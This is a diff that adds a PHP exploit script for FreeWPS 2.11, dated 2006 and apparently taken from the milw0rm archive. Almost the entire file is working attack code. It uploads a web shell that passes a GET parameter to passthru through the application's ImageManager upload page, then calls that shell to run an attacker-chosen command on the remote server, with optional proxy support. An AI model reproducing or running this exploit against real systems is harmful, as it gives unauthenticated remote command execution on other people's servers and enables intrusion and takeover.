@@ -1,0 +1,83 @@
+<?
+error_reporting(E_ERROR);
+
+function exploit_init()
+{
+    if (!extension_loaded('php_curl') && !extension_loaded('curl'))
+    {
+       if (!dl('curl.so') && !dl('php_curl.dll'))
+       die ("oo error - cannot load curl extension!");
+    }
+}
+
+function exploit_header()
+{
+    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
+    echo "                                  oo    ooooooo     ooooooo\n";
+    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
+    echo "                      888o888    888        o888   888888888\n";
+    echo "                      o88888o    888     o888   o 888o   o888\n";
+    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
+    echo "ooooooooooooooooooooooooooooo freewps 2.11 exploit ooooooooooooooooooooooooooooo\n";
+    echo "oo usage          $ php freewps-211-exploit.php [url] [cmd]\n";
+    echo "oo proxy support  $ php freewps-211-exploit.php [url] [cmd] [proxy]:[port]\n";
+    echo "oo example        $ php freewps-211-exploit.php http://localhost 'ls -a'\n";
+    echo "oo execute a command on the remote system by uploading a shell\n\n";
+    echo "oo command : " . $_SERVER['argv'][2] . "\n\n";
+}
+
+function exploit_bottom()
+{
+    echo "\noo greets   : b0xC - i want to wish you a happy 21st birthday! this is my small\n";
+    echo "              present for you. :)\n";
+    echo "oo discover : x128 - alexander wilhelm - 21/03/2006\n";
+    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net\n";
+}
+
+function exploit_execute()
+{
+    $connection = curl_init();
+
+    if ($_SERVER['argv'][3])
+    {
+        curl_setopt($connection, CURLOPT_TIMEOUT, 8);
+        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][3]);
+    }
+    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');
+    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt ($connection, CURLOPT_HEADER, 0);
+
+    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/upload/shell.php");
+    $source = curl_exec($connection);
+
+    if(strpos($source, "404"))
+    {
+       $shell = fopen("shell.php", "w");
+       fwrite($shell, "<? ini_set(max_execution_time,0); passthru(\$HTTP_GET_VARS[shell]); ?>");
+       fclose($shell);
+
+       curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/htmlarea/popups/ImageManager/images.php");
+       curl_setopt ($connection, CURLOPT_POST, 1);
+       curl_setopt ($connection, CURLOPT_POSTFIELDS, array("upload" => "@shell.php", "dirPath"=> "/upload"));
+       curl_exec($connection) or die("oo error - cannot connect!\n");
+
+       sleep(2);
+       unlink("shell.php");
+    }
+    curl_setopt ($connection, CURLOPT_POST, 0);
+    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/upload/shell.php?shell=" . urlencode($_SERVER['argv'][2]));
+
+    $source = curl_exec($connection) or die("oo error - cannot connect!\n");
+
+    echo $source;
+
+    curl_close ($connection);
+}
+
+exploit_init();
+exploit_header();
+exploit_execute();
+exploit_bottom();
+?>
+
+# milw0rm.com [2006-03-21]
